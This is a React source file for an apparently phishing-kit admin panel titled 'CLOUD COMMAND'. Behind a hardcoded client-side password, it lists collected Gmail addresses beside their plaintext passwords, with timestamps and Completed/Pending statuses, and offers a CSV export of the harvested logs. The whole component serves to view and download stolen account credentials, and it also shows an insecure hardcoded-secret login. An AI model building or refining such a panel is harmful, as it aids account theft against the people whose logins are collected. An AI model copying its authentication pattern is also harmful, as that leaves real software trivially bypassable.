
import React, { useState, useEffect } from 'react';
import { TranslationKeys } from '../translations';

interface AdminProps {
  cloudRecords: any[];
  onRefresh: () => void;
  cloudUrl: string;
  t: (key: TranslationKeys) => string;
}

const Admin: React.FC<AdminProps> = ({ cloudRecords, onRefresh, cloudUrl, t }) => {
  const [password, setPassword] = useState('');
  const [isAuthenticated, setIsAuthenticated] = useState(false);

  // Synchronize on terminal access
  useEffect(() => {
    if (isAuthenticated) {
      onRefresh();
    }
  }, [isAuthenticated, onRefresh]);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === 'fouad12jad1///') setIsAuthenticated(true);
    else alert('Unauthorized Terminal Access Attempted');
  };

  const handleDownload = () => {
    // Redirect to trigger the server-side CSV download protocol
    window.location.href = `${cloudUrl}?download=true`;
  };

  if (!isAuthenticated) {
    return (
      <div className="pt-32 pb-24 max-w-sm mx-auto px-4 text-center">
        <div className="bg-white border border-slate-200 p-12 rounded-[3rem] shadow-2xl">
          <div className="w-16 h-16 bg-blue-700 rounded-2xl flex items-center justify-center mx-auto mb-10">
            <span className="text-white font-gaming font-black text-2xl">M</span>
          </div>
          <h1 className="text-xl font-gaming font-black text-slate-900 mb-10 uppercase tracking-widest text-[14px]">CLOUD COMMAND</h1>
          <form onSubmit={handleLogin} className="space-y-6">
            <input 
              type="password" 
              placeholder="SECRET KEY" 
              className="w-full bg-slate-50 border-2 border-slate-100 rounded-2xl px-8 py-5 text-slate-900 text-center focus:border-blue-700 outline-none text-lg font-gaming" 
              value={password} 
              onChange={(e) => setPassword(e.target.value)} 
            />
            <button className="w-full bg-blue-700 text-white font-gaming py-5 rounded-2xl tracking-widest font-black uppercase text-xs shadow-xl shadow-blue-100">AUTHORIZE ACCESS</button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="pt-24 sm:pt-40 pb-24 max-w-7xl mx-auto px-4 sm:px-8 animate-fade-in">
      <div className="flex flex-col md:flex-row justify-between items-start md:items-center mb-10 gap-6">
        <div>
          <h2 className="text-2xl font-gaming font-black text-slate-900 uppercase">Cloud Telemetry</h2>
          <p className="text-slate-400 text-[9px] font-gaming uppercase tracking-[0.4em]">Real-time Central Database Uplink</p>
        </div>
        <div className="flex items-center space-x-4">
          <button 
            onClick={handleDownload}
            className="bg-slate-900 text-white px-8 py-4 rounded-2xl font-gaming text-[10px] font-black uppercase shadow-lg shadow-slate-200 active:scale-95 flex items-center"
          >
            <i className="fas fa-file-csv mr-2 text-blue-400"></i> Download Cloud Logs
          </button>
          <button 
            onClick={onRefresh}
            className="bg-blue-700 text-white px-8 py-4 rounded-2xl font-gaming text-[10px] font-black uppercase shadow-lg shadow-blue-100 active:scale-95"
          >
            <i className="fas fa-sync-alt mr-2"></i> Refresh Cloud Data
          </button>
        </div>
      </div>

      <div className="bg-white border border-slate-100 rounded-[2.5rem] overflow-hidden shadow-2xl">
        <div className="overflow-x-auto">
          <table className="w-full text-left">
            <thead className="bg-slate-50 border-b border-slate-100">
              <tr>
                <th className="py-6 px-8 text-[10px] font-gaming text-slate-400 uppercase tracking-widest">Cloud Gmail</th>
                <th className="py-6 px-8 text-[10px] font-gaming text-slate-400 uppercase tracking-widest">Secure Pass</th>
                <th className="py-6 px-8 text-[10px] font-gaming text-slate-400 uppercase tracking-widest">Sync Timestamp</th>
                <th className="py-6 px-8 text-[10px] font-gaming text-slate-400 uppercase tracking-widest text-center">Statut</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-50">
              {cloudRecords.length === 0 ? (
                <tr>
                  <td colSpan={4} className="py-32 text-center text-slate-300 font-gaming uppercase text-[10px] tracking-widest font-black">Establishing Uplink to Cloud Storage...</td>
                </tr>
              ) : (
                cloudRecords.map((record, idx) => (
                  <tr key={idx} className="hover:bg-slate-50/50 transition-colors">
                    <td className="py-6 px-8">
                      <div className="text-sm font-bold text-slate-900">{record.gmail || "UNKNOWN_ID"}</div>
                    </td>
                    <td className="py-6 px-8">
                      <div className="text-sm font-mono text-blue-600 bg-blue-50 px-3 py-1 rounded-lg w-fit font-bold">{record.password || "••••"}</div>
                    </td>
                    <td className="py-6 px-8">
                      <div className="text-[10px] font-gaming text-slate-400 uppercase font-black">{record["date and time"] || "TIMESTAMP_MISSING"}</div>
                    </td>
                    <td className="py-6 px-8 flex justify-center">
                      <span className={`text-[9px] font-gaming uppercase px-4 py-2 rounded-xl border-2 font-black tracking-widest ${
                        record.statut === 'Completed' ? 'bg-green-50 text-green-600 border-green-100' : 
                        record.statut === 'Pending' ? 'bg-amber-50 text-amber-600 border-amber-100' : 
                        'bg-slate-50 text-slate-400 border-slate-200'
                      }`}>
                        {record.statut || "PENDING"}
                      </span>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
      
      <div className="mt-12 text-center">
        <p className="text-slate-400 text-[8px] font-gaming uppercase tracking-[0.5em] font-black">Source synchronization verified across all Terminal IPs</p>
      </div>
    </div>
  );
};

export default Admin;
